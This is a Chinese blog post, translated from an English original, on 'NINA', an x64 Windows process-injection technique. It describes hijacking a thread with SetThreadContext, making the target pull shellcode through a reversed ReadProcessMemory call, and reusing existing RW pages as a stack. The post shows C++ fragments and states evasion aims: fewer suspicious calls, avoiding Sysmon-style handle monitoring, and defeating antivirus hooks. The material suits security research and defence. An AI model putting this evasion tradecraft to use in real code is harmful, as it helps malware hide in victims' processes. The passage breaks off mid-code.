<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>x64 进程注入技术 —— NINA | zeronohacker</title><meta name="keywords" content="NINI,Inject"><meta name="author" content="zeronohacker"><meta name="copyright" content="zeronohacker"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文翻译自：https:&#x2F;&#x2F;undev.ninja&#x2F;nina-x64-process-injection&#x2F;  前述在本文中，我将详细介绍一种实验性的进程注入技术，其中对比较通用的和“危险”函数使用施加了严格的限制，即 WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，Que"><meta property="og:type" content="article"><meta property="og:title" content="x64 进程注入技术 —— NINA"><meta property="og:url" content="https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/index.html"><meta property="og:site_name" content="zeronohacker"><meta property="og:description" content="本文翻译自：https:&#x2F;&#x2F;undev.ninja&#x2F;nina-x64-process-injection&#x2F;  前述在本文中，我将详细介绍一种实验性的进程注入技术，其中对比较通用的和“危险”函数使用施加了严格的限制，即 WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，Que"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://image.zeronohacker.com/top_img/2020/06/05/hacker-injecting-code.jpg"><meta property="article:published_time" content="2020-06-05T10:04:25.000Z"><meta property="article:modified_time" content="2021-09-19T11:17:39.408Z"><meta property="article:author" content="zeronohacker"><meta property="article:tag" content="NINA"><meta property="article:tag" content="Inject"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://image.zeronohacker.com/top_img/2020/06/05/hacker-injecting-code.jpg"><link rel="shortcut icon" href="https://image.zeronohacker.com/favicon.png"><link rel="canonical" href="https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!1}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"x64 进程注入技术 —— NINA",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2021-09-19 19:17:39"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)}),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.min.css" media="defer" onload='this.media="all"'><script async src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="zeronohacker" type="application/atom+xml"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image.zeronohacker.com/header.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://image.zeronohacker.com/top_img/2020/06/05/hacker-injecting-code.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zeronohacker</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">x64 进程注入技术 —— NINA</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-06-05T10:04:25.000Z" title="undefined 2020-06-05 18:04:25">2020-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="x64 进程注入技术 —— NINA"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2020/06/05/nina-x64-process-injection/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2020/06/05/nina-x64-process-injection/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote><p>本文翻译自：<a target="_blank" rel="noopener" href="https://undev.ninja/nina-x64-process-injection/">https://undev.ninja/nina-x64-process-injection/</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在本文中，我将详细介绍一种实验性的进程注入技术，其中对比较通用的和“危险”函数使用施加了严格的限制，即 <strong>WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。 我称这种技术为 NINA：No Injection，No Allocation。 该技术的目的是为了通过减少可疑的 call 数量而不需要复杂的 ROP 链进而达到更加的隐蔽效果。 PoC 可以在这里找到：</p><p><a target="_blank" rel="noopener" href="https://github.com/NtRaiseHardError/NINA">https://github.com/NtRaiseHardError/NINA</a></p><p>测试环境：</p><ul><li>Windows 10 x64 version 2004</li><li>Windows 10 x64 version 1903</li></ul><h2 id="实现-No-Injection"><a href="#实现-No-Injection" class="headerlink" title="实现 No Injection"></a>实现 No Injection</h2><p>让我们从移除需要注入的数据这种情况开始。最基本的进程注入所需要的操作：</p><ul><li>包含 payload 的目标地址；</li><li>将 payload 传递给目标进程；</li><li>执行操作以执行 payload；</li></ul><p>为了将重点放在 No Injection 部分，我将使用经典的 VirtualAllocEx 在远程进程中分配内存。 重要的是要防止页面同时具有写和执行权限，因此应首先设置 RW，然后在写入数据后用 RX 重新保护。 由于我稍后将讨论 No Allocation 方法，因此我们现在可以将页面设置为 RWX，以使事情变得简单。</p><p>如果我们限制自己不使用数据注入，则意味着恶意进程不会使用 WriteProcessMemory 将数据直接从自身传输到目标进程。 为了解决这个问题，我受到Deep Instinct（复杂）“Inject Me”进程注入技术（由 @slaeryan 分享）记录的反向 ReadProcessMemory 的启发。 还有其他将数据传递到进程的方法：使用 GlobalGetAtomName（来自 Atom Bombing 技术），以及通过命令行选项或环境变量传递数据（使用 CreateProcess 调用来生成目标进程）。 但是，这三种方法有一个小的限制，那就是 payload 不得包含 NULL 字符。 Ghost Writing 也许是一种选择，但它需要复杂的 ROP 链。</p><p>为了得到执行，我选择了 SetThreadContext 函数的线程劫持技术，因为我们不能使用 <strong>CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。</p><p>下面是大体的一个过程：</p><ul><li>CreateProcess 生成目标进程；</li><li>VirtualAllocEx 为 payload 和堆栈分配内存；</li><li>SetThreadContext 强制目标进程执行 ReadProcessMemory；</li><li>SetThreadContext 执行 payload；</li></ul><h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><p>使用这种注入技术时应考虑一些注意事项。 第一个是来自 CreateProcess 的调用。 尽管此技术不依赖于 CreateProcess，但出于某些原因，使用它代替诸如 OpenProcess 或 OpenThread 之类的方法可能更有利。 原因之一是，没有远程（外部）进程访问权限来获取句柄，否则这些句柄可能会被使用ObRegisterCallbacks 的监视工具（例如 Sysmon）检测到。 另一个原因是，它允许使用命令行和环境变量进行上述两种数据注入方法。 如果您正在创建进程，则还可以利用 <a target="_blank" rel="noopener" href="https://blog.xpnsec.com/protecting-your-malware/">blockdll 和 ACG</a> 来击败防病毒用户模式下 HOOK。</p><h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>当然，目标进程需要能够容纳 payload，但是此技术还需要堆栈。 这将很快阐明。</p><h3 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h3><p>要以相反的方式使用此功能，我们必须考虑两个问题：在堆栈上传递 5 个参数，并对我们自己的恶意进程使用有效的进程句柄。 让我们先来看第 5 个参数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  *lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用 SetThreadContext 仅允许在 x64 上使用前四个参数。 如果我们阅读 lpNumberOfBytesRead 的描述，我们可以看到它是可选的：</p><div class="tip"><p>指向变量的指针，该变量接收传输到指定缓冲区的字节数， 如果 lpNumberOfBytesRead 为 NULL，则忽略该参数。</p></div><p>幸运的是，如果我们使用 VirtualAllocEx 创建页面，该函数会将它们归 0：</p><div class="tip"><p>在指定进程的虚拟地址空间内保留，提交或更改内存区域的状态， 该函数将其分配的内存初始化为 0。</p></div><p>将堆栈设置为 0 分配的页面将使得第 5 个参数有效。</p><p>第二个问题是传递给 ReadProcessMemory 的进程句柄。 因为我们正试图让目标进程读取我们的恶意进程，所以我们需要为其提供处理程序的句柄。 这可以使用 DuplicateHandle 函数来实现。 它会被赋予我们当前进程句柄，并返回一个可以被目标进程使用的句柄。</p><h3 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h3><p>SetThreadContext 是强大而灵活的功能，它允许读取，写入和执行。 但是，使用它传递 fastcall 参数存在一个已知问题：易失性寄存器 RCX，RDX，R8 和 R9 无法可靠地设置为所需值。考虑以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to read shellcode</span></span><br><span class="line"><span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    <span class="comment">// Target thread</span></span><br><span class="line">    &amp;TargetThread,</span><br><span class="line">    <span class="comment">// Set RIP to read our shellcode</span></span><br><span class="line">    _ReadProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to stack</span></span><br><span class="line">    StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Handle to our own process to read shellcode</span></span><br><span class="line">    TargetProcess,</span><br><span class="line">    <span class="comment">// RDX: Address to read from</span></span><br><span class="line">    &amp;Shellcode,</span><br><span class="line">    <span class="comment">// R8: Buffer to store shellcode</span></span><br><span class="line">    TargetBuffer,</span><br><span class="line">    <span class="comment">// R9: Size to read</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果执行此代码，我们期望当目标线程到达 ReadProcessMemory 时，易失性寄存器将保持其正确的值。但是，这不是实际发生的情况：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CA9DFE2D9145CECD6F71BB5D689CDEF4.png" alt=""></p><p>由于某些未知的原因，易失性寄存器被更改，使该技术无法使用。 RCX 不是进程的有效句柄，RDX 为 0，R9 太大。 我发现一种方法可以可靠地设置易失性寄存器：在使用 SetThreadContext 之前，只需将 RIP 设置为无限 jmp -2 循环即可。 让我们来看看它的作用：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/7BAF12FF23B954527B4D2C75D76C46EF.png" alt=""></p><p>可以使用 SetThreadContext 执行无限循环，然后可以使用正确的易失性寄存器调用 ReadProcessMemory：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/A6000B5907CB4BE65EB45AB86CF3F805.png" alt=""></p><p>现在我们需要处理返回。 请注意，我们已分配并转至我们自己的堆栈。 如果我们可以使用 ReadProcessMemory 将 Shellcode 读入 RSP 的堆栈位置，则可以设置 Shellcode 的前 8 个字节，以便它重新回到自身。 这是一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to Shellcode + 8</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/06/05/420994740F05B40711840E38FCA670AA.png" alt=""></p><p>RSP 和 R8 指向 000001F457C21000。 向上的地址将用于 ReadProcessMemory 调用中的堆栈。 将要写入 Shellcode 的目标缓冲区从 R8 向下。 当 ReadProcessMemory 返回时，它将使用 shellcode 的前 8 个字节作为实际 shellcode 起始处的 000001F457C21008 的返回地址：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/39788EDE3F4EA6FFEF7F7CFF5C75109B.png" alt=""></p><h2 id="实现：No-Allocation"><a href="#实现：No-Allocation" class="headerlink" title="实现：No Allocation"></a>实现：No Allocation</h2><p>现在让我们讨论如何通过移除对 VirtualAllocEx 的依赖来进行改进。 这与上一节相比并不那么琐碎，因为会出现一些初始问题：</p><ul><li>我们如何为 ReadProcessMemory 设置堆栈</li><li>如果没有 RWX 节，如何使用 ReadProcessMemory 编写和执行 Shellcode</li></ul><p>但是，为什么要在已经可以使用的内存中分配内存呢？ 请记住，如果内存中的任何现有页面都受到影响，则应注意不要覆盖任何关键数据（如果应恢复原始执行流程）。</p><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如果我们无法为堆栈分配内存，则可以找到一个空白的 RW 页面来使用。如果担心 ReadProcessMemory 的第 5 个参数为 NULL，则可以轻松解决。 如果我们不想覆盖潜在的关键数据，则可以利用可执行映像内可能的 RW 页面内的节填充。 当然，这假定存在可用的填充。</p><p>要在可执行映像的内存范围内定位 RW 页面，我们可以通过进程环境块（PEB）定位映像的基址，然后使用 VirtualQueryEx 枚举范围。 此函数将返回诸如保护及其大小之类的信息，这些信息可用于查找任何现有的 RW 页面，以及它们的大小是否适合 Shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get PEB.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInformation,</span><br><span class="line">    &amp;ProcessBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESS_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get image base.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInfo.PebBaseAddress,</span><br><span class="line">    &amp;Peb,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PEB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    ImageBaseAddress = Peb.Reserved3[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get DOS header.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ImageBaseAddress,</span><br><span class="line">    &amp;DosHeader,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get NT headers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    (LPBYTE)ImageBaseAddress + DosHeader.e_lfanew,</span><br><span class="line">    &amp;NtHeaders,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Look for existing memory pages inside the executable image.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = <span class="number">0</span>; i &lt; NtHeaders.OptionalHeader.SizeOfImage; i += MemoryBasicInfo.RegionSize) &#123;</span><br><span class="line">    <span class="built_in">VirtualQueryEx</span>(</span><br><span class="line">        ProcessHandle,</span><br><span class="line">        (LPBYTE)ImageBaseAddress + i,</span><br><span class="line">        &amp;MemoryBasicInfo,</span><br><span class="line">        <span class="built_in"><span class="keyword">sizeof</span></span>(MEMORY_BASIC_INFORMATION)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Search for a RW region to act as the stack.</span></span><br><span class="line">    <span class="comment">// Note: It&#x27;s probably ideal to look for a RW section </span></span><br><span class="line">    <span class="comment">// inside the executable image memory pages because</span></span><br><span class="line">    <span class="comment">// the padding of sections suits the fifth, optional</span></span><br><span class="line">    <span class="comment">// argument for ReadProcessMemory and WriteProcessMemory.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (MemoryBasicInfo.Protect &amp; PAGE_READWRITE) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Stack location in RW page starting at the bottom.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到正确的页面后，应从页面底部向上枚举堆栈的位置（由于堆栈的性质），并且应该为 ReadProcessMemory 的第五个参数找到一个 0x0000000000000000 的值。 这意味着我们需要确保堆栈偏移量距底部加 Shellcode 的空间至少为 0x28。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                   +--------------+</span><br><span class="line">                   |     ...      |</span><br><span class="line">                   +--------------+ -0x30</span><br><span class="line">    Should be 0 -&gt; |     arg5     |</span><br><span class="line">                   +--------------+ -0x28</span><br><span class="line">                   |     arg4     |</span><br><span class="line">                   +--------------+ -0x20</span><br><span class="line">                   |     arg3     |</span><br><span class="line">                   +--------------+ -0x18</span><br><span class="line">                   |     arg2     |</span><br><span class="line">                   +--------------+ -0x10</span><br><span class="line">                   |     arg1     |</span><br><span class="line">                   +--------------+ -0x8</span><br><span class="line">                   |     ret      |</span><br><span class="line">                   +--------------+ 0x0</span><br><span class="line">                   |   Shellcode  |</span><br><span class="line">Bottom of stack -&gt; +--------------+ </span><br></pre></td></tr></table></figure><p>下面是一些演示代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate a stack to read a local copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Stack = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, AddressSize);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Scan stack for NULL fifth arg</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Success = <span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    Address,</span><br><span class="line">    Stack,</span><br><span class="line">    AddressSize,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Enumerate from bottom (it&#x27;s a stack).</span></span><br><span class="line"><span class="comment">// Start from -5 * 8 =&gt; at least five arguments + shellcode.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = AddressSize - <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T) - <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode); i &gt; <span 